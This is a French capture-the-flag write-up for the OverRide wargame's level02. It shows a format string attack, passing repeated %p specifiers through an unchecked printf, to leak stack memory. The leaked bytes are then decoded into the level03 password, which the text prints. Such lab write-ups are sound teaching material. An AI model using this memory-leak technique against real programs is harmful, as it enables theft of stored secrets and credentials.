On a un programme qui nous demande un nom d'utilisateur et un mot de passe:
level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: user42
--[ Password: my_mdp
*****************************************
user42 does not have access!

Quand on analyse avec gdb on remarque plusieurs choses: on a un system(/bin/sh) seulement si on arrive à faire en sorte que notre mdp
soit égale à un élément qui a été lu dans le fichier /home/users/level03/.pass auparavant.
C'est donc compliqué puisque c'est justement cette clé qu'on cherche.
Mais la bonne nouvelle c'est que le fichier que l'on cherche a donc été lu, et la clé est stockée dans quelque part dans la stack.
De plus on repère une autre faille: un printf(variable_directe).
C'est un format string attack, en utilisant le  printf sans string de parsage on peut introduire nous même uns string comportant des modifiers qui iront donc chercher dans la mémoire des info pour nous:
Ici c'est la variable username qui est appelé:
printf(username);
donc si username = "%p"
printf("%p")
%p n'est associé à aucune variable en second argument, il va donc aller chercher le premier pointeur qu'il va trouver dans la stack :

level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %p %p %p
--[ Password: 
*****************************************
0x7fffffffe4f0 (nil) (nil) does not have access!

Regardons à quoi cette addresse correspont cette addresse dans la mémoire :

(gdb) b main
Breakpoint 1 at 0x400818
(gdb) run
Starting program: /home/users/level02/level02 
Breakpoint 1, 0x0000000000400818 in main ()
(gdb) x/20wx 0x7fffffffe4f0
0x7fffffffe4f0:	0x00000000	0x00000000	0xf7b945e8	0x00007fff
0x7fffffffe500:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe510:	0x00000000	0x00000000	0xf7ffe620	0x00007fff
0x7fffffffe520:	0x00000000	0x00000001	0x00000000	0x00000000
0x7fffffffe530:	0x00000000	0x00000000	0x00400477	0x00000000

(gdb) x/20wx $rbp-0x70
0x7fffffffe560:	0x00000009	0x00000000	0x000000c2	0x00000000 -> là ou commence le stockage de username
0x7fffffffe570:	0xffffe5de	0x00007fff	0x00400ac0	0x00000000
0x7fffffffe580:	0x00000000	0x00000000	0x00400653	0x00000000
0x7fffffffe590:	0xffffe676	0x00007fff	0x00400b05	0x00000000
0x7fffffffe5a0:	0x00f0b5ff	0x00000000	0x00400ac0	0x00000000
(gdb) x/20wx $rbp-0xa0
0x7fffffffe530:	0x00000000	0x00000000	0x00400477	0x00000000 -> là ou commence le stockage de la clé lue dans le file .pass
0x7fffffffe540:	0x00000000	0x00000000	0xf7abc240	0x00007fff
0x7fffffffe550:	0x00000000	0x00000000	0x00000076	0x00000000
0x7fffffffe560:	0x00000009	0x00000000	0x000000c2	0x00000000
0x7fffffffe570:	0xffffe5de	0x00007fff	0x00400ac0	0x00000000
(gdb) x/20wx $rbp-0x110
0x7fffffffe4c0:	0x00000001	0x00000000	0x00000000	0x00000000 -> là ou le stockage du mot de passe commence
0x7fffffffe4d0:	0x00000001	0x00000000	0xf7ffe2c8	0x00007fff
0x7fffffffe4e0:	0x00000000	0x00000000	0x00000001	0x00000000
0x7fffffffe4f0:	0x00000000	0x00000000	0xf7b945e8	0x00007fff -> là où le premier %p commence
0x7fffffffe500:	0x00000000	0x00000000	0x00000000	0x00000000

Donc l'addresse renvoyé par le premier %p 0x7fffffffe4f0 est une addresse qui se trouve là où est sensé être enregistré le mdp,
or le mdp est enregistré juste avant la clé qu'on cherche à obtenir.

Donc shématiquement on a :
.______________________________________.      ^ 
|               RBP                    |     /|\
|______________________________________|      |
|               ...                    |      |
|         stockage username            |      |
|______________________________________|      |
| RBP-0x70 => début stockage username  |      |
|          => 0x7fffffffe560           |      |
|______________________________________|      |
|                 ...                  |      |
|      stockage clé lue dans .pass     |      |
|______________________________________|      |
| RBP-0xa0 => début stockage de la clé |      |
|           =>  0x7fffffffe530         |      |
|______________________________________|      |  
|                ...                   |      |
|      stockage du mot de passe        |      |
|______________________________________|      |
|            0x7fffffffe4f0            |      |
|    (première addresse qui apparait   |    --> %p 
|        quand on utilise l'attaque    |
|        en introduisant %p dans       |
|             username)                |
|______________________________________|
|                 ...                  |
|      stockage du mot de passe        |
|______________________________________|
| RBP-0x110 => début stockage du mdp   |
|           =>  0x7fffffffe4c0         |
|______________________________________|


Donc, si on ecrit plusieurs %p dans username, le programme va à chaque fois remonté dans la mémoire pour trouver le prochain pointeur.
On pourra donc remonter petit à petit l'intégralité du stockage du mot de passe pour arriver jusqu'au stockage de notre clé lu dans le /home/users/level03/.pass

level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
--[ Password: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
*****************************************
0x7fffffffe4f0(nil)0x410x2a2a2a2a2a2a2a2a0x2a2a2a2a2a2a2a2a0x7fffffffe6e80x1f7ff9a080x41414141414141410x4141414141414141
0x41414141414141410x41414141414141410x41414141414141410x41414141414141(nil)(nil)(nil)(nil)(nil)(nil)
0x100000000(nil)0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d(nil)0x7025702570257025
0x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x7025702570257025
0x70257025702570250x7025702570257025(nil)(nil)0x2900000000 does not have access!

Effectivement on trouve après nos "A" quelque chose qui pourrait correspondre :
0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d

-> on espace les addresse pour pkus de lisibilité:
0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d

-> on inverse les addresse pour le little-endian  :
     0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d
  =  0x4868373452506e75 0x51397361354a4145 0x58674e5743717a37 0x7358476e68354a35 0x4d394b6650673348

-> et on traduit à l'aide d'une table ascii :
     0x48 68 37 34 52 50 6e 75    0x51 39 73 61 35 4a 41 45    0x58 67 4e 57 43 71 7a 37    0x73 58 47 6e 68 35 4a 35    0x4d 39 4b 66 50 67 33 48
        H  h  7  4  R  P  n  u       Q  9  s  a  5  J  A  E       X  g  N  W  C  q  z  7       s  X  G  n  h  5  J  5       M  9  K  f  P  g  3  H

on a notre mot de passe :
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H